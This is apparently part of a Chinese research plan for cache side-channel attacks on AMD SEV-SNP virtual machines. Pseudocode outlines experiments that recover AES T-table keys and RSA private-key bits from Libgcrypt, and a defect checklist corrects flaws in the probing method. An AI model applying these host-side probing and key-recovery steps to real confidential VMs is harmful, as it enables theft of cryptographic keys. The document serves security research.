**方法**：基于 5.3-C 数据，截取前 1,000 / 2,000 / 5,000 / 10,000 / 20,000 / 50,000 / 100,000 轮，对每个截断点独立执行密钥恢复，绘制收敛曲线。

**产出**：

- [ ] 恢复率 vs 观测轮次曲线（16 字节平均正确率 + 完整密钥成功率两条线）

**实现路线**：

```
# 复用 5.3-C 已采集的 observations（无需重新采集）
checkpoints = [1000, 2000, 5000, 10000, 20000, 50000, 100000]
for n in checkpoints:
    result = run_correlation_attack(observations[:n])
    byte_accuracy[n]    = sum(result[i]==true_key[i] for i in 16) / 16
    full_key_success[n] = (result == true_key)

plot(checkpoints, byte_accuracy, full_key_success)
```

---

## 5.4 RSA 平方-乘密钥恢复攻击

### 实验 5.4-A：Square vs Multiply 操作区分

**目的**：验证能否通过缓存侧信道区分 RSA 的平方操作和乘操作，建立时序探测与操作序列的对应关系。

**前提**：通过"攻击前置：目标 GPA 定位"流程定位 Libgcrypt `mpi_mulm` 函数所在物理页的 HPA。`mpi_mulm` 是代码函数，函数体约 20–50 条指令（64–200 字节），可能跨 1–3 条缓存行。代码页同样受 DRAM 交错影响，需在正式探测前对 `mpi_mulm` 所在页的相关缓存行做 SNR 预扫描，选取信号最强的行作为探测目标——如果直接使用函数入口处的缓存行而该行恰为弱 SNR 行，multiply 操作的检测率将显著下降。

具体步骤：先对 `mpi_mulm` 所在物理页执行与 5.3-A 相同的扫描（VM 内重复调用 `mpi_mulm`，宿主侧逐缓存行测延迟分布），选出 Δ_mean 最大的 1–2 行作为探测目标。

**方法**：

1. 使用**已知**私钥，在受害者 VM 执行 RSA-2048 签名，预先计算出正确的 square/multiply 操作序列
2. 攻击者以高频连续探测 `mpi_mulm` 所在缓存行，记录完整时序轨迹
3. 将探测序列与已知操作序列对齐，分析 square-only 时段 vs multiply 时段的延迟分布差异

**产出**：

- [ ] Square vs Multiply 延迟分布对比图
- [ ] 单次操作区分准确率
- [ ] 探测时序与操作序列的对齐可视化

**实现路线**：

```
# 已知密钥 d（2048 bit），预计算操作序列
ops = []
for bit in bits_of(d):
    ops.append('S')          # square
    if bit == 1:
        ops.append('M')      # multiply

攻击者（宿主侧）：
  target_hpa = mpi_mulm_hpa
  send_tcp(victim_rsa, hash)      # 触发签名
  # 高频轮询（探测间隔 < mpi_mulm 单次执行时间）
  trace = []
  while signing_in_progress:
      t = rdtscp_load(target_hpa)
      trace.append(t)

  # 分割：将连续 H1 簇识别为一次 mpi_mulm 调用
  call_sequence = segment_calls(trace, theta=THETA)
  # 对齐 call_sequence 与 ops，计算 per-call 准确率
  align_and_score(call_sequence, ops)
```

---

### 实验 5.4-B：密钥比特序列重建

**目的**：从探测时序序列中重建 RSA 私钥的比特序列（单次签名）。

**方法**：

1. VM 使用固定已知密钥执行 RSA-2048 签名
2. 将时序信号分割为操作簇，按"每比特一个 S、bit=1 时额外一个 M"的模式解码
3. 与真实密钥比特序列逐位对比

**产出**：

- [ ] 密钥比特恢复率（正确比特数 / 总比特数）
- [ ] 比特错误位置分布
- [ ] 多次独立签名的恢复一致性

**实现路线**：

```
# 解码规则（单次签名）：
call_seq = segment_calls(trace)     # 从探测轨迹中提取调用序列
recovered_bits = []
i = 0
while i < len(call_seq):
    if call_seq[i] == 'H1':         # square
        if i+1 < len(call_seq) and call_seq[i+1] == 'H1':  # multiply
            recovered_bits.append(1)
            i += 2
        else:
            recovered_bits.append(0)
            i += 1

accuracy = sum(r==t for r,t in zip(recovered_bits, true_bits)) / len(true_bits)
```

---

### 实验 5.4-C：多次签名累积评估

**目的**：评估通过 M 次独立签名观测取多数投票后的完整密钥恢复能力。

**方法**：收集 M=10 / 50 / 100 / 500 次独立签名的探测序列，对同一密钥比特位置取多数投票，绘制比特恢复率 vs 签名次数曲线。

**产出**：

- [ ] 比特恢复率 vs 签名观测次数曲线
- [ ] 从部分密钥比特恢复完整 RSA 密钥的可行性分析（Coppersmith / Heninger-Shacham，可选）

**实现路线**：

```
all_recovered = []
for m in range(M):
    send_tcp(victim_rsa, same_hash)
    trace = collect_trace(mpi_mulm_hpa)
    bits  = decode_bits(trace)
    all_recovered.append(bits)

# 多数投票
for bit_pos in range(2048):
    votes = [all_recovered[m][bit_pos] for m in range(M)]
    final_bit[bit_pos] = majority_vote(votes)

# 绘制不同 M 下的比特恢复率
for m in [10, 50, 100, 500]:
    acc = evaluate(all_recovered[:m])
    plot_point(m, acc)
```

---

## 5.5 攻击效果综合评估

### 实验 5.5-A：多负载场景攻击成功率

**目的**：评估真实系统负载下端到端攻击的鲁棒性（与第 4 章 §4.3.1 的信道测量形成呼应，但评估指标从 AUC/SNR 变为密钥恢复率）。

**方法**：在空载 / 中度负载（2–3 个后台 VM）/ 高负载（`stress-ng` 满载）三种条件下分别执行 AES 和 RSA 攻击。

**产出**：

- [ ] AES/RSA 密钥恢复率在三种负载下的对比图
- [ ] 达到相同恢复率所需轮次的变化

**实现路线**：

```
for load in [idle, medium, high]:
    setup_load(load)                          # 启动后台负载
    run_aes_attack(N=50000) → aes_result[load]
    run_rsa_attack(M=100)   → rsa_result[load]
    teardown_load(load)

plot_grouped_bar(aes_result, rsa_result, x_axis=['空载','中度','高负载'])
```

---

### 实验 5.5-B：多次独立实验一致性

**目的**：验证攻击的可重复性（不同随机密钥）。

**方法**：各独立执行 10 轮 AES 攻击和 10 轮 RSA 攻击（每轮使用不同随机密钥），统计跨轮次恢复率均值和标准差，绘制箱线图。

**产出**：

- [ ] AES/RSA 恢复率箱线图（10 轮分布）

**实现路线**：

```
for trial in range(10):
    key = random_key()
    update_victim_key(key)
    aes_acc[trial] = run_aes_attack(key, N=50000)
    rsa_acc[trial] = run_rsa_attack(key, M=100)

boxplot(aes_acc, rsa_acc)
```

---

### 实验 5.5-C：自适应阈值校准长期稳定性

**目的**：验证滑动窗口自适应校准（每 N=1000 轮更新 θ）在长时间攻击中的稳定性，作为系统设计有效性的佐证。

**方法**：对比固定阈值 vs 自适应阈值在 1 小时连续 AES 攻击运行中的判决准确率变化曲线及阈值漂移幅度。

**产出**：

- [ ] 固定 vs 自适应阈值的准确率随时间变化曲线
- [ ] 阈值漂移幅度统计（说明自适应机制的必要性）

**实现路线**：

```
# 固定阈值组
run_aes_attack_1h(theta=466, adaptive=False)
  → record (timestamp, theta, accuracy) every 60s

# 自适应阈值组
run_aes_attack_1h(theta_init=466, adaptive=True, window=1000)
  → record (timestamp, theta, accuracy) every 60s

plot_dual(fixed_accuracy, adaptive_accuracy, x='time(min)')
plot_theta_drift(adaptive_theta_trace)
```

---

### 实验 5.5-D：与 Prime+Probe 在 SEV-SNP 下的密钥恢复对比

**目的**：展示本文方法相对传统方法的优势（与第 4 章 §4.4 信道能力对比形成呼应，但评估指标为密钥恢复效果）。

**方法**：在同一平台、同一受害者 VM、同一密码库版本下，分别执行本文方法（跨域逐出信号）和 Prime+Probe 的 AES 密钥恢复，对比恢复效果。

**产出**：

- [ ] 对比表：

| 指标           | 本文方法 | Prime+Probe (SEV-SNP) |
| -------------- | -------- | --------------------- |
| 单字节恢复率   |          |                       |
| 完整密钥恢复率 |          |                       |
| 所需加密轮次   |          |                       |
| 密钥熵缩减     |          |                       |

**实现路线**：

```
# 本文方法：同 5.3-C
run_coherence_eviction_attack(N=50000) → result_ours

# Prime+Probe：填充 LLC cache set，受害者 AES 后重新访问，测置换延迟
# SEV-SNP 下 P+P 的主要困难：cache set 索引依赖 HPA，需要 HPA 已知
run_prime_probe_attack(N=50000)        → result_pp

compare_table(result_ours, result_pp)
```

---

### 实验 5.5-E：SEV-SNP 安全模型影响评估

**目的**：总结攻击对 SEV-SNP 安全承诺的实际威胁等级。

**方法**：定性 + 定量，基于信息泄露速率、密钥恢复所需时间、攻击前置条件的现实可满足性，对照 AMD 安全白皮书给出评估。

**产出**：

- [ ] 威胁评估表
- [ ] 与 AMD 安全声明的对照分析段落

**实现路线**：

```
量化指标（来自 5.3-C / 5.4-C 数据）：
  - AES 密钥恢复所需时间 = N_min_encryptions / victim_request_rate
  - RSA 密钥恢复所需时间 = M_min_signatures / victim_signing_rate
  - 信息泄露速率 = 第 4 章信道容量估算值

对照 AMD 安全白皮书：
  - SEV-SNP 声明保护来宾内存机密性 → 本文通过侧信道绕过，说明范围
  - RMP 完整性保护 → 本攻击未触及，需说明边界
```

---

## 方案缺陷与待修正问题

> 本节记录当前实验设计中发现的遗漏与错误，作为实现前的 checklist。

### 关键缺陷（会导致攻击无法运行）

#### 缺陷 1：缓存行对齐——`te_base_hpa + i*64` 地址计算错误

**问题**：`static const u32 Te0[256]` 只保证 4 字节对齐，**不保证 64 字节缓存行对齐**。若 `te_base_hpa % 64 = 16`，则：

- `te_base_hpa + 0*64` 指向缓存行偏移 +16 处（不是行起始）
- Te0 的第一条缓存行（地址 `te_base_hpa & ~63`）只包含 12 个条目（indices 0–11），不是 16 个
- 第二条缓存行包含 Te0[12..27]，跨两个"局部行"

**后果**：公式 `cache_line = (pt[i]^key[i]) >> 4` 只在 Te0 恰好 64 字节对齐时正确；否则 index-to-cache-line 映射非线性，评分函数产生系统性偏差。

**修正**：

```
te_cl_base_hpa = te_base_hpa & ~63ULL   # 向下取缓存行对齐
# 探测第 i 条缓存行（i=0..63）：te_cl_base_hpa + i*64
# 公式修正：
# line_of_idx = ((te_base_hpa % 64) + idx * 4) / 64  （整除）
```

---

#### 缺陷 2：HPA 非线性——跨 GPA 页时 `te_base_hpa + i*64` 物理地址无效

**问题**：Te0–Te3 共 4096 字节，若 Te0[0] 不在页起始，这 4096 字节必然跨越两个 GPA 页（4KB 边界）。KVM 不保证两个相邻 GPA 页映射到相邻 HPA 页。

**后果**：对跨页的缓存行，`te_base_hpa + i*64` 计算出的 HPA 可能是物理内存中完全无关的地址，导致探测结果无意义。

**修正**：在 5.3-A 初始化阶段，对每条目标缓存行**分别**调用 `KVM_AMD_GPA_TO_HPA`：

```
for i in 0..63:
    gpa_i = (te0_gpa & ~63) + i * 64
    hpa_table[i] = KVM_AMD_GPA_TO_HPA(gpa_i)   # 可能跨页，不能用 te_base_hpa + i*64
```

---

#### 缺陷 3：缺少预热步骤——相干逐出信号的前置条件未满足

**问题**：相干逐出产生 H1 的前提是"宿主缓存中有该行的热副本 → 来宾访问后驱逐它 → 宿主下次 load 才看到高延迟"。当前实现路线：

```
send_tcp(victim_aes, pt)
h1 = rdtscp_load(target_hpa) > THETA   ← 缓存可能本来就冷
```

若缓存行未被宿主预热，该行本身就是冷的，探测结果也是高延迟，与来宾是否访问无关——完全无法区分 H0/H1。

**修正**：每次触发前必须预热目标缓存行：

```
# 1. 预热（把目标缓存行加载进宿主缓存）
for cl in top_k_lines:
    _ = rdtscp_load(hpa_table[cl])   # 结果丢弃，仅为预热

# 2. 触发 AES（来宾访问 → 驱逐宿主热副本）
send_tcp(victim_aes, pt)
wait_tcp_response()                  # 确保 AES 已完成再探测

# 3. 探测（热→冷 = H1；热→热 = H0）
for cl in top_k_lines:
    hits[cl] = rdtscp_load(hpa_table[cl]) > THETA
```

---

#### 缺陷 4：Libgcrypt 1.7.6 实际指数算法未验证

**问题**：方案假设使用"二进制平方-乘法"（每比特：1次 square；若 bit=1 额外 1次 multiply）。但 Libgcrypt 从 1.6.x 起默认使用 **k-ary 滑动窗口**（window size = 4 或 5），此时：

- 操作模式不是"每比特独立 1 或 2 次调用"
- 每个窗口同时处理多个比特，调用次数与单个比特值无直接对应关系
- RSA 签名通常启用 CRT（将 mod n 分解为 mod p + mod q），指数是 d_p 和 d_q，结构不同

若实际使用滑动窗口，§5.4 整个攻击模型（"2次 H1=bit1, 1次 H1=bit0"）均不成立。

**必须做**：在受害者 VM 中实测验证——用已知私钥的签名操作 + perf 确认 `mpi_mulm` 调用次数与预期的二进制平方-乘模式一致；若不一致，需改用 Libgcrypt 提供的 `--enable-bin-exp` 编译选项或选择其他支持纯二进制模幂的库版本。

---

### 重要设计遗漏

#### 遗漏 1：NPT 扫描 ioctl（0xd8/0xd9）尚未实现

整个"攻击前置：目标 GPA 定位"流程依赖 `kvm_npt_clear_accessed` 和 `kvm_npt_scan_accessed`，但当前 KVM 补丁（`amdese_snp_host_latest_add_gpa_to_hpa_and_read_hpa.patch`）只实现了 0xd6 和 0xd7。这是所有攻击实验能否启动的阻塞依赖，需在 5.3-A 之前完成内核补丁扩展。

#### 遗漏 2：同表多次访问的噪声量化缺失

每次 AES 加密 Te0 被访问 4 次（key[0,4,8,12]）。评分 key[0] 时，另 3 次访问（key[4,8,12]）会以约 `3 × (1/16) ≈ 19%` 的概率产生额外假阳性 H1。信噪比约为 1:3，意味着达到相同置信度大约需要 4× 更多观测轮次。方案目前仅说"不破坏收敛性"，但未给出观测轮次估算，5.3-C 的 `N=10,000–100,000` 设定需结合此噪声模型重新核对。

#### ~~遗漏 3~~：两阶段探测设计——**已修正**

已在以下位置落地两阶段设计：
- **5.3-A'**：新增时序标定实验，测量 TCP 请求到 T-Table 访问的时延分布（t_offset_mean / t_offset_sigma），为 Phase 2 确定探测窗口
- **5.3-B/C 实现路线**：改写为"预热 → Phase 2 NOCACHE 竞争探测（事中，±2σ 窗口）→ 等响应 → Phase 1 相干逐出探测（事后）→ OR 合并信号"的完整两阶段协议
- Phase 2 在 AES 执行期间使用 NOCACHE（`KVM_AMD_READ_GPA` ioctl 0xd7 的 `CIPHERTEXT_NOCACHE` 模式）探测竞争；Phase 1 在 AES 完成后用 cacheable 探测相干逐出。两者路径不同，互补：Phase 2 信号弱（Δ=104.8 cyc，第 4 章 42b）但需精确地址重叠、无 DRAM 交错跨行噪声；Phase 1 信号强（Δ=470.8 cyc）但可能有交错假阳性
- 评分函数使用合并信号（phase1_h1 OR phase2_h1），并保留分离分析接口用于论文中信号贡献量化

---

### 优先级汇总

| 优先级 | 问题                       | 影响                             |
| ------ | -------------------------- | -------------------------------- |
| P0     | 缺陷 3：预热步骤缺失       | 信号完全失效，H0/H1 无法区分     |
| P0     | 缺陷 2：HPA 非线性（跨页） | 探测物理地址错误                 |
| P0     | 缺陷 1：缓存行对齐         | index-to-line 映射错误，评分偏差 |
| P0     | 缺陷 4：Libgcrypt 滑动窗口 | RSA 攻击模型可能整体不适用       |
| P1     | 遗漏 1：NPT ioctl 未实现   | 地址定位流程阻塞                 |
| P1     | 遗漏 2：同表噪声量化       | 实验观测量需求低估               |
| ~~P2~~ | ~~遗漏 3：Phase 2 未落地~~ | ~~已修正，见 5.3-A'/B/C~~        |

---
